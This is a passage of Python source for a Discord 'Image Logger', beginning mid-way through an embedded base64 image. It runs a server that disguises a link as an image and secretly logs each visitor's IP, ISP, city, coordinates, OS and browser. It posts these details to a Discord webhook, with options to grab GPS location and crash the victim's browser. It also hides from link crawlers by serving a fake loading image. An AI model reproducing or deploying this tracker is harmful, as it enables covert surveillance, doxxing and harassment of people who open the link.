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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
